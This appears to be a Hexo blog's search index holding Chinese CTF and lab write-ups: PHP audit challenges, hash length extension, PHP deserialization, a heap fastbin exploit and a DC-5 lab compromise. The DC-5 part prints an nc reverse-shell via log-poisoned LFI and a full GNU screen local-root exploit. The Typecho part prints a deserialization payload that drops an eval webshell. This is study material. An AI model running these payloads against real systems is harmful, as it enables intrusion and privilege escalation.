<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[php-storm环境]]></title>
    <url>%2F2019%2F08%2F14%2Fphp-storm%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[继续配置了一波phpStorm的环境，感觉对这个IDE还有很多可以研究的地方 在这里可以修改php的路径，我选择了phpStudy的一个php解释器，因为其中安装了Xdebug。 配置apache的环境，选择的是Local or mounted folder,因为服务器就在本地 路由映射 之后就可以在phpStorm写完代码部署到本地的服务器上了 也可以debug了]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>phpStorm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP-Audit-Labs学习]]></title>
    <url>%2F2019%2F08%2F13%2FPHP-Audit-Labs%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[php-challenge]]></title>
    <url>%2F2019%2F08%2F12%2Fphp-challenge%2F</url>
    <content type="text"><![CDATA[继续分析GitHub上的一个代码审计项目 challenge-10 1234567891011121314151617181920212223242526&lt;?phperror_reporting(0);echo "&lt;!--index.phps--&gt;";if(!$_GET['id'])&#123; header('Location: index.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder!harder!";&#125;?&gt; 小tricks： var_dump('a'==true); 结果为true var_dump('a' == 0); 结果为true 所以id输入一个字母就能够使得!$_GET['id']为false，同时$id == 0为true $data是从一个文件中得到的结果，这时候想到php伪协议，输入a=php://input再post数据就行 eregi(&quot;111&quot;.substr($b, 0, 1), &quot;1114&quot;) 结合后面的substr($b, 0, 1)!=4 要通过substr函数的截断才行 所以设置$b=%00111111, substr函数会被截断，strlen不会，eregi就能匹配上了。 补充一点php伪协议的知识，参考了LoRexxar师傅的文章。 php中支持的伪协议很多， 123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 我们最常用的任意文件读取的payload就是用了php://协议： 1php://filter/read=convert.base64-encode/resource=upload.php 针对php://filter，官方文档是这样写的： 12345名称 描述resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 在我们的payload中，upload.php就是要过滤的数据流，convert.base64-encode就是要读链的筛选列表 之所以要base64编码，一般是为了数据传输的方便 官方文档中能够举了如下栗子： 123456789101112131415161718&lt;?php$fp = fopen('php://output', 'w');stream_filter_append($fp, 'convert.base64-encode');fwrite($fp, "This is a test.\n");fclose($fp);$param = array('line-length'=&gt;8, 'line-break-chars'=&gt;"\r\n");$fp = fopen('php://output', 'w');stream_filter_append($fp, 'convert.base64-encode', STREAM_FILTER_WRITE, $param);fwrite($fp, "This is a test.\n");fclose($fp);$fp = fopen('php://output', 'w');stream_filter_append($fp, 'convert.base64-decode');fwrite($fp, "VGhpcyBpcyBhIHRlc3QuCg==");fclose($fp);?&gt; 除了base64之外还有其他的一些过滤器，官方文档中有些。 challenge-11 1234567891011121314151617181920212223242526272829&lt;?php error_reporting(0);$link = mysql_connect('localhost', 'root', '');if (!$link) &#123; die('Could not connect to MySQL: ' . mysql_error()); &#125; // 选择数据库$db = mysql_select_db("test", $link);if(!$db)&#123; echo 'select db error'; exit();&#125;// 执行sql$password = $_GET['pwd'];$sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";var_dump($sql);$result=mysql_query($sql) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );$row1 = mysql_fetch_row($result);var_dump($row1);mysql_close($link);?&gt; challenge-12 123456&lt;?php error_reporting(0);show_source(__FILE__);$a = @$_REQUEST['hello'];eval("var_dump($a);"); 字符串直接拼接 ?hello=);eval(phpinfo());// challenge-13 1234567891011121314151617181920212223242526272829303132&lt;?phpshow_source(__FILE__);$v1=0;$v2=0;$v3=0;$a=(array)json_decode(@$_GET['foo']);if(is_array($a))&#123; is_numeric(@$a["bar1"])?die("nope"):NULL; if(@$a["bar1"])&#123; ($a["bar1"]&gt;2016)?$v1=1:NULL; &#125; if(is_array(@$a["bar2"]))&#123; if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope"); $pos = array_search("nudt", $a["a2"]); $pos===false?die("nope"):NULL; foreach($a["bar2"] as $key=&gt;$val)&#123; $val==="nudt"?die("nope"):NULL; &#125; $v2=1; &#125;&#125;$c=@$_GET['cat'];$d=@$_GET['dog'];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi("3|1|c",$d.$c[0])?die("nope"):NULL; strpos(($c[0].$d), "htctf2016")?$v3=1:NULL; &#125;&#125;if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; include "flag.php"; echo $flag;&#125;?&gt; 可能是我对json不是很了解，这里必须都使用双引号才行。 两个不是弱类型的trick： 12var_dump(0===false) 为falsevar_dump(null===false) 为false]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[哈希扩展攻击继续分析]]></title>
    <url>%2F2019%2F08%2F12%2F%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%BB%A7%E7%BB%AD%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[最近看到了好多针对de1ctf ssrfme题目分析，顺便把之前没搞明白的哈希长度扩展攻击写一下 链接这篇文章讲的很仔细了，分析一下文章中的栗子 师傅给的代码 md5的过程 MD5 padding 如果输入信息的长度(字节)对64求余的结果不等于56，就需要填充使得对64求余的结果等于56。填充的方法是填充一个x80和xx个0。填充完后，信息的长度为N*64+56(字节)，并且最后8个字节用来记录原始输入信息长度 MD5 compress 这个算法直接到网上找就行 所以MD5的过程就是： 先进行消息长度的填充(padding)。填充完后，初始化的4个Magic number会和第一个64字节的Message block进行md5 compress压缩算法。压缩算法完成后，会产生新的4个Magic number。这样再进行第二个64字节Message block的md5 compress压缩算法。以此类推……直到压缩到最后64个字节的(Message block + padding)，最后得到的Magic number经过hex转化就是最后的md5 hash值 比如md5('admin'),由于padding之后只有64个字节，所以只进行一轮的md5 compress 得到的密文就是： 21232f297a57a5a743894a0e4a801fc3 我们可以从密文推导出4个magic number： 1234A=0x292f2321LB=0xa7a5577aLC=0xe4a8943LD=0xc31f804aL 这个关系就是大小端转化一下 md5长度扩展的攻击过程 知道如下三个值： md5(salt+message)的值 message内容 salt+message长度 我们可以根据md5(salt+message)的值逆向出最后的四个magic number 12345def compute_magic_number(self, md5str): self.A = struct.unpack("I", md5str[0:8].decode('hex'))[0] self.B = struct.unpack("I", md5str[8:16].decode('hex'))[0] self.C = struct.unpack("I", md5str[16:24].decode('hex'))[0] self.D = struct.unpack("I", md5str[24:32].decode('hex'))[0] 这个四个magic number去和m做一下次的md5 compress 再理解一下 继续又看了一篇师傅的文章，想要好好梳理一下哈希扩展攻击 师傅是以sha1算法为例讲解的： sha1的流程如下： sha1算法和md5很相似，也有最初的四个IV，并且是确定的(这是一种很不好的方法但是也是一种无奈的举动) 一个不足64位的字符串会被padding至64位，并且由于只有一个分组，所以只需要一轮运算即可 我们在前一次64位padding之后的字符串的基础上加入一些字符，sha1(salt+padding+add_data) 首先这里肯定是要分成两组的，前一组加密后的内容已经知道了，同时产生的新的IV会参与下一次的复杂的数学运算 而这些IV是能够从第一组的密文中得知的，这就导致下一组加密后的内容实际上我们也可以知道的 《白帽子讲web安全》上提到，如何利用长度扩展攻击： LengthExtension 使得可以在原文之后附加任意的值，并计算出新的hash值，最常见的地方就是签名 错误的签名校验算法 参数连接时没有使用分隔符，本来是?a=1&amp;b=2&amp;c=3在签名算法中简单地变成了a1b2c3 于是攻击者可以伪造参数?a=1b2c3[...padding....]&amp;b=4&amp;c=5 最终在签名算法中连接时变成了a1b2c3[...padding...]b4c5 附加任意的参数 HPP 最简单的防护就是将secret放置在参数的末尾 举例 大师傅给的栗子： 1234567891011121314151617181920&lt;?php$role = $_REQUEST["role"];$hash = $_REQUEST["hash"];$salt = "meme"; if ($hash !== md5($salt.$role))&#123; echo 'wrong!'; exit;&#125;if ( $role == 'admin')&#123; echo 'wrong, hash cann\'t be admin'; exit;&#125;echo "You are ".$role.'&lt;/br&gt;';echo 'Congradulation!';?&gt; 已知role为admin，salt的长度为4，hash值为：c7813629f22b6a7d28a08041db3e80a9 我们可以在role后面附加任意的数据使得第一个if被绕过 用大师傅的脚本： python md5pad.py c7813629f22b6a7d28a08041db3e80a9 joychou 9 当然也可以这样： 1234567$ hashpump Input Signature: c7813629f22b6a7d28a08041db3e80a9Input Data: adminInput Key Length: 9Input Data to Add: joychou06cf5a94dcda53659f58c0f411ba0bd8admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x00\x00\x00\x00\x00\x00\x00joychou 注意第三次输入的数据长度是包括salt在内的 参考 深入理解hash长度扩展攻击（sha1为例） Hash Length Extension Attack]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>hash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php反序列化笔记1]]></title>
    <url>%2F2019%2F08%2F11%2Fphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B01%2F</url>
    <content type="text"><![CDATA[在freebuf上看到了一篇新的php反序列化的文章，借此继续分析一下php反序列化。 文章中的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135&lt;?phperror_reporting(0);class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125; &#125; function waf($str)&#123; $str=preg_replace("/[&lt;&gt;*;|?\n ]/","",$str); $str=str_replace('flag','',$str); return $str; &#125; function echos($host)&#123; system("echos $host".$host); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array("echos"))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125;&#125;$first='hi';$var='var';$bbb='bbb';$ccc='ccc';$i=1;foreach($_GET as $key =&gt; $value) &#123; if($i===1) &#123; $i++; $$key = $value; &#125; else&#123;break;&#125;&#125;if($first==="doller")&#123; var_dump($_GET['a']); @parse_str($_GET['a']); if($var==="give") &#123; if($bbb==="me") &#123; if($ccc==="flag") &#123; echo"&lt;br&gt;welcome!&lt;br&gt;"; $come=@$_POST['come']; unserialize($come); &#125; &#125; else &#123;echo "&lt;br&gt;think about it&lt;br&gt;";&#125; &#125; else &#123; echo "NO"; &#125;&#125;else&#123; echo "Can you hack me?&lt;br&gt;";&#125;?&gt; 有两个小trick需要绕过，都是变量覆盖的漏洞，同时parse_str函数需要接受的是一个字符串，为了在浏览器栏中输入需要将&amp;符号进行URL编码 http://localhost/test/unserialize.php?first=doller&amp;a=var=give%26bbb=me%26ccc=flag 这样就能绕过两个小trick 之后就是怎么利用那个反序列化了，__construct函数没有什么用，__wakeup方法会将私有属性args通过一个waf函数进行过滤，__destruct函数中有一个危险函数call_user_func_array,注意到调用这个函数的时候传入的是一个数组，其实就是调用这个this类中的一个方法。但是之前的if判断限制了调用的方法只能是echos，分析echos方法发现其中有一个system函数，但是echo错误的拼成了echos 😆 于是我们的思路就是通过传入反序列化后的值使得echos函数被调用执行我们的命令，这就设计到在Linux或者Windows中一行执行多条命令的方式。 在Linux中： &amp;是不管前后命令是否执行成功都会执行前后命令 &amp;&amp;是前面的命令执行成功才能执行后面的命令 ||是前面的命令执行不成功才能执行后面的命令 |管道符 构造出反序列化数据如下： O:4:&quot;come&quot;:2:{s:10:&quot;comeargs&quot;;a:1:{i:0;s:4:&quot;&amp;dir&quot;;}s:12:&quot;comemethod&quot;;s:5:&quot;echos&quot;;} 但是。。。 var_dump一下发现了： :\ProgramFiles\phpstudy\PHPTutorial\WWW\test\unserialize.php:104:string 'O:4:&quot;come&quot;:2:{s:10:&quot;comeargs&quot;;a:1:{i:0;s:4:&quot;' (length=44) 发现数据被截断了。。 var_dump之前的构造的反序列化数据： 12O:4:&quot;come&quot;:2:&#123;s:10:&quot;comeargs&quot;;a:1:&#123;i:0;s:4:&quot;&amp;dir&quot;;&#125;s:12:&quot;comemethod&quot;;s:5:&quot;echos&quot;;&#125;F:\notes\audit\test.php:8: ---&gt; echo出来的结果string(86) &quot;O:4:&quot;come&quot;:2:&#123;s:10:&quot;\000come\000args&quot;;a:1:&#123;i:0;s:4:&quot;&amp;dir&quot;;&#125;s:12:&quot;\000come\000method&quot;;s:5:&quot;echos&quot;;&#125;&quot; ---&gt; var_dump出来的结果 因为php在反序列化数据时： protected属性的表示方式是在变量名前加个%00*%00 private表示方式是在变量名前加上%00类名%00 所以次数的两个private属性都被加上了00阶段符号，于是只能通过python手动编码传输数据了 12345678910import requestsurl = "http://localhost/test/unserialize.php?first=doller&amp;a=var=give%26bbb=me%26ccc=flag"n = '00'.decode('hex')o = 'O:4:"come":2:&#123;s:12:"'+n+'come'+n+'method";s:5:"echos";s:10:"'+n+'come'+n+'args";a:1:&#123;i:0;s:4:"&amp;dir";&#125;&#125;"'r = requests.post(url, data=&#123;"come":o&#125;)print r.text 返回的结果如下： 之后如果要读取flag还有几个姿势，但不是本文的重点了 typecho反序列化漏洞 先放出payload 12345678910111213141516171819202122&lt;?php class Typecho_Request&#123; private $_filter=array("assert"); private $_params=array("screenName"=&gt;"file_put_contents('jrxnm.php', '&lt;?php eval(\$_GET[jrxnm]);');"); &#125; class Typecho_Feed&#123; private $_items = array(); private $_type = 'RSS 2.0'; function __construct()&#123; $item['author'] = new Typecho_Request(); $this-&gt;_items[0] = $item; &#125; &#125; $abc = new Typecho_Feed();echo base64_encode(serialize(array("adapter"=&gt;$abc,"prefix"=&gt;"_typecho"))); 序列化一个数组之后作为cookie传入，关键代码： 此处$config接收cookie中的参数，那么$config此时就是一个数组: $config = array(&quot;adapter&quot;=&gt;$abc, &quot;prefix&quot;=&gt;&quot;_typecho&quot;) 其中adapter键对应的是一个对象。 然后$config的两个键值对应的value都作为参数进入了一个类。 查看该类的构造方法发现存在字符串拼接： 那么查找__toString()魔术方法，我们发现在Feed.php文件中的一个类：Typecho_Feed $item['author']-&gt;screenName如果$item['author'] 是一个对象，且不存在screenName属性时，会自动调用__get魔法函数。 于是我们想要在实例化Typecho_Db类的时候，调用Typecho_Feed类中的__toString方法 此时继续寻找__get方法： 在Request.php文件中有一个类Typecho_Request中的__get方法如下： 1234567891011/** * 获取实际传递参数(magic) * * @access public * @param string $key 指定参数 * @return void */public function __get($key)&#123; return $this-&gt;get($key);&#125; 继续分析get方法： 12345678910111213141516171819202122232425public function get($key, $default = NULL)&#123; $value = $default; switch (true) &#123; case isset($this-&gt;_params[$key]): $value = $this-&gt;_params[$key]; break; case isset($_GET[$key]): $value = $_GET[$key]; break; case isset($_POST[$key]): $value = $_POST[$key]; break; case isset($_COOKIE[$key]): $value = $_COOKIE[$key]; break; default: $value = $default; break; &#125; $value = is_array($value) || strlen($value) &gt; 0 ? $value : $default; return $this-&gt;_filter ? $this-&gt;_applyFilter($value) : $value;&#125; 如果$this-&gt;_filter，就会调用_applyFilter方法： 123456789101112private function _applyFilter($value)&#123; if ($this-&gt;_filter) &#123; foreach ($this-&gt;_filter as $filter) &#123; $value = is_array($value) ? array_map($filter, $value) : call_user_func($filter, $value); &#125; &#125; $this-&gt;_filter = array(); return $value;&#125; 此时终于看到了call_user_func方法，函数名是this-&gt;_filter 再看一道反序列化 ``php &lt;?php class Template{ public $cacheFile = '/tmp/cachefile'; public $template = '&lt;div&gt;welcome back %s &lt;/div&gt;'; public function __construct($data=null) { $data=$this-&gt;lodaData($data); $this-&gt;render($data); } public function loadData($data){ if(substr($data, 0, 2) !== '0:' &amp;&amp; !preg_match('/0:\d:\/', $data)){ return unserialize($data); } return []; } public function createCache($file=null, $tpl=null){ $file = $file ?? $this-&gt;cacheFile; $tpl = $tpl ?? $this-&gt;template; file_put_contents($file, $tpl); } public function render($data){ echo sprintf($this-&gt;template, htmlspecialchars($data['name'])); } public function __destruct() { $this-&gt;createCache(); } } new Template($_COOKIE['data']); 123456789101112这道题也是反序列化的应用，利用思路很清晰就是通过`__destruct`调用`createCache`写入一个webshell重点在于这里：```php public function loadData($data)&#123; if(substr($data, 0, 2) !== &apos;0:&apos; &amp;&amp; !preg_match(&apos;/0:\d:\/&apos;, $data))&#123; return unserialize($data); &#125; return []; &#125; 如果绕过这个if判断，这里需要分析一下php的源码：在'O:',后面可以增加'+'，用来绕过正则判断。 参考 PHP反序列化漏洞简介及相关技巧小结]]></content>
      <tags>
        <tag>php</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctfbabyheap]]></title>
    <url>%2F2019%2F08%2F10%2F0ctfbabyheap%2F</url>
    <content type="text"><![CDATA[被0ctf的这道题目搞了好久。记录一下 思路是使用fastbin attack，how2heap上有一个栗子可以分析一下 先申请5个chunk，free之后使得 fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL 12345678allocate(0x10) # idx 0, 0x00allocate(0x10) # idx 1, 0x20allocate(0x10) # idx 2, 0x40allocate(0x10) # idx 3, 0x60allocate(0x80) # idx 4, 0x80# free idx 1, 2, fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULLfree(2)free(1) 此时的bins 12345678910pwndbg&gt; binsfastbins0x20: 0x5619d93ea020 —▸ 0x5619d93ea040 ◂— 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbin 1234567891011121314151617181920pwndbg&gt; x/40gx 0x5619d93ea0000x5619d93ea000: 0x0000000000000000 0x0000000000000021 ---&gt;idx00x5619d93ea010: 0x0000000000000000 0x00000000000000000x5619d93ea020: 0x0000000000000000 0x0000000000000021 ---&gt;idx10x5619d93ea030: 0x00005619d93ea040 0x00000000000000000x5619d93ea040: 0x0000000000000000 0x0000000000000021 ---&gt;idx20x5619d93ea050: 0x0000000000000000 0x00000000000000000x5619d93ea060: 0x0000000000000000 0x0000000000000021 ---&gt;idx30x5619d93ea070: 0x0000000000000000 0x00000000000000000x5619d93ea080: 0x0000000000000000 0x0000000000000091 ---&gt;idx40x5619d93ea090: 0x0000000000000000 0x00000000000000000x5619d93ea0a0: 0x0000000000000000 0x00000000000000000x5619d93ea0b0: 0x0000000000000000 0x00000000000000000x5619d93ea0c0: 0x0000000000000000 0x00000000000000000x5619d93ea0d0: 0x0000000000000000 0x00000000000000000x5619d93ea0e0: 0x0000000000000000 0x00000000000000000x5619d93ea0f0: 0x0000000000000000 0x00000000000000000x5619d93ea100: 0x0000000000000000 0x00000000000000000x5619d93ea110: 0x0000000000000000 0x0000000000020ef10x5619d93ea120: 0x0000000000000000 0x0000000000000000 然后我们修改idx2的指针,通过fill idx0造成溢出，同时由于内存对齐，可以肯定idx4的指针最后肯定是0x80 修改后如下： 1234567891011pwndbg&gt; x/40gx 0x560e5e91c0000x560e5e91c000: 0x0000000000000000 0x0000000000000021 ---&gt;idx00x560e5e91c010: 0x6161616161616161 0x61616161616161610x560e5e91c020: 0x0000000000000000 0x0000000000000021 ---&gt;idx10x560e5e91c030: 0x0000560e5e91c080 0x0000000000000000 0x560e5e91c040: 0x0000000000000000 0x0000000000000021 ---&gt;idx20x560e5e91c050: 0x0000000000000000 0x00000000000000000x560e5e91c060: 0x0000000000000000 0x0000000000000021 ---&gt;idx30x560e5e91c070: 0x0000000000000000 0x00000000000000000x560e5e91c080: 0x0000000000000000 0x0000000000000091 ---&gt;idx40x560e5e91c090: 0x0000000000000000 0x0000000000000000 此时的bins指向： 123456pwndbg&gt; binsfastbins0x20: 0x560e5e91c020 —▸ 0x560e5e91c080 ◂— 0x0 (idx2--&gt;idx4)0x30: 0x00x40: 0x00x50: 0x0 如果再连续申请两个chunk，那么第一次是idx2，第二次就是idx4 但是malloc有一个check机制，如果两个fastbin的大小不一样就会报错，所以我们再借用一下idx3，让其溢出到idx4，修改idx4的大小 1234567891011pwndbg&gt; x/40gx 0x5573e66cd000 0x5573e66cd000: 0x0000000000000000 0x0000000000000021 ---&gt;idx00x5573e66cd010: 0x6161616161616161 0x6161616161616161 0x5573e66cd020: 0x0000000000000000 0x0000000000000021 ---&gt;idx10x5573e66cd030: 0x00005573e66cd080 0x00000000000000000x5573e66cd040: 0x0000000000000000 0x0000000000000021 ---&gt;idx20x5573e66cd050: 0x0000000000000000 0x00000000000000000x5573e66cd060: 0x0000000000000000 0x0000000000000021 ---&gt;idx30x5573e66cd070: 0x6161616161616161 0x61616161616161610x5573e66cd080: 0x0000000000000000 0x0000000000000021 ---&gt;idx40x5573e66cd090: 0x0000000000000000 0x0000000000000000 此时idx4的大小已经被修改了，于是可以申请了 12allocate(0x10) # idx 1allocate(0x10) # idx 2, which point to idx4's location 之后，如果我们想要将 idx 4 放到 unsorted bin 中的话，先需要把它的大小改回来，同时为了防止其与 top chunk 合并，我们需要再次申请一个 chunk。此后再释放 idx4 就会进入 unsorted bin 中去了。 1234567891011121314pwndbg&gt; x/40gx 0x559b5b9a50000x559b5b9a5000: 0x0000000000000000 0x0000000000000021 ---&gt;idx00x559b5b9a5010: 0x6161616161616161 0x6161616161616161 0x559b5b9a5020: 0x0000000000000000 0x0000000000000021 ---&gt;idx10x559b5b9a5030: 0x0000000000000000 0x00000000000000000x559b5b9a5040: 0x0000000000000000 0x0000000000000021 ---&gt;idx20x559b5b9a5050: 0x0000000000000000 0x00000000000000000x559b5b9a5060: 0x0000000000000000 0x0000000000000021 ---&gt;idx30x559b5b9a5070: 0x6161616161616161 0x61616161616161610x559b5b9a5080: 0x0000000000000000 0x0000000000000091 ---&gt;idx40x559b5b9a5090: 0x00007fa9e254eb78 0x00007fa9e254eb780x559b5b9a50a0: 0x0000000000000000 0x00000000000000000x559b5b9a50b0: 0x0000000000000000 0x00000000000000000x559b5b9a50c0: 0x0000000000000000 0x0000000000000000 此时dump(2)就可以得到unsorted bin 的地址了。 此时的bins如下 123456789101112pwndbg&gt; binsfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x559b5b9a5080 —▸ 0x7fa9e254eb78 (main_arena+88) ◂— 0x559b5b9a5080smallbins]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>onegadget</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DC靶机渗透]]></title>
    <url>%2F2019%2F08%2F09%2FDC%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[DC 5 之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了 123456789101112# root @ kali in ~ [4:06:38] $ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)192.168.41.1 00:50:56:c0:00:08 VMware, Inc.192.168.41.2 00:50:56:e0:f7:aa VMware, Inc.192.168.41.166 00:0c:29:d7:ef:a4 VMware, Inc.192.168.41.167 00:0c:29:fd:e8:73 VMware, Inc. ---&gt; DC5靶机192.168.41.254 00:50:56:f5:fb:f6 VMware, Inc.5 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.5: 256 hosts scanned in 2.346 seconds (109.12 hosts/sec). 5 responded masscan扫出了几个端口： 12345678910# root @ kali in ~ [4:09:46] $ masscan -p0-65535 192.168.41.167 --rate=1000000Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 08:10:19 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 1 hosts [65536 ports/host]Discovered open port 80/tcp on 192.168.41.167 Discovered open port 111/tcp on 192.168.41.167 Discovered open port 33188/tcp on 192.168.41.167 然后上nmap扫服务 12345678910111213141516# root @ kali in ~ [4:10:42] $ nmap -p80,111,33188 -sV -T4 192.168.41.167Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-09 04:15 EDTStats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 66.67% done; ETC: 04:15 (0:00:06 remaining)Nmap scan report for 192.168.41.167Host is up (0.00042s latency).PORT STATE SERVICE VERSION80/tcp open http nginx 1.6.2111/tcp open rpcbind 2-4 (RPC #100000)33188/tcp open status 1 (RPC #100024)MAC Address: 00:0C:29:FD:E8:73 (VMware)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 11.63 seconds 访问原始网页： dirsearch.py似乎没有发现什么 123456Target: http://192.168.41.167 [16:24:35] Starting:[16:24:35] 400 - 172B - /%2e%2e/google.com[16:24:42] 301 - 184B - /css -&gt; http://192.168.41.167/css/[16:24:44] 301 - 184B - /images -&gt; http://192.168.41.167/images/[16:24:44] 200 - 4KB - /index.php 看了师傅们的提示，发现footer.php很有趣 每次刷新数字都会变化 同时发现在 http://192.168.41.167/thankyou.php页面也有这种效果，于是猜想是不是本地文件包含漏洞 访问http://192.168.41.167/thankyou.php?file=/etc/passwd，页面回显了！ 同时该主机使用的是nginx服务，于是可以写一个shell到日志中并且包含这个文件 写入webshell，注意这里使用的是passthru函数 同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。 kali监听一个端口然后访问如下路由去包含文件并且弹shell http://192.168.41.167/thankyou.php?file=/var/log/nginx/access.log&amp;cmd=nc%20192.168.41.165%202333%20-c%20/bin/bash 核心命令nc 192.168.41.165 -c /bin/bash 此时的权限是www-data 接下来看如何提权 上提权辅助脚本 链接 发现有这个文件 exploit-db上搜一下exp： 123456789101112131415161718192021222324252627282930313233343536373839404142#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017) echo "~ gnu/screenroot ~"echo "[+] First, we create our shell and library..."cat &lt;&lt; EOF &gt; /tmp/libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123; chown("/tmp/rootshell", 0, 0); chmod("/tmp/rootshell", 04755); unlink("/etc/ld.so.preload"); printf("[+] done!\n");&#125;EOFgcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.crm -f /tmp/libhax.ccat &lt;&lt; EOF &gt; /tmp/rootshell.c#include &lt;stdio.h&gt;int main(void)&#123; setuid(0); setgid(0); seteuid(0); setegid(0); execvp("/bin/sh", NULL, NULL);&#125;EOFgcc -o /tmp/rootshell /tmp/rootshell.crm -f /tmp/rootshell.cecho "[+] Now we create our /etc/ld.so.preload file..."cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so" # newline neededecho "[+] Triggering..."screen -ls # screen itself is setuid, so... /tmp/rootshell DC5后记 thankyou.php文件中有以下内容；典型的本地文件包含漏洞 12345678910111213141516&lt;div class="footer-wrapper"&gt; &lt;footer&gt; &lt;?php $file = $_GET['file']; if(isset($file)) &#123; include("$file"); &#125; else &#123; include("footer.php"); &#125; ?&gt; &lt;/footer&gt; DC1 arp-scan发现主机 12345678# root @ kali in ~ [9:46:49] $ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)192.168.41.1 00:50:56:c0:00:08 VMware, Inc.192.168.41.2 00:50:56:e0:f7:aa VMware, Inc.192.168.41.168 00:0c:29:9f:4c:60 VMware, Inc. ---&gt; DC1靶机192.168.41.254 00:50:56:f5:fb:f6 VMware, Inc. 扫描端口 1234567891011# root @ kali in ~ [9:46:56] $ masscan -p0-65535 192.168.41.168 --rate=1000000Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 13:47:23 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 1 hosts [65536 ports/host]Discovered open port 111/tcp on 192.168.41.168 Discovered open port 47738/tcp on 192.168.41.168 Discovered open port 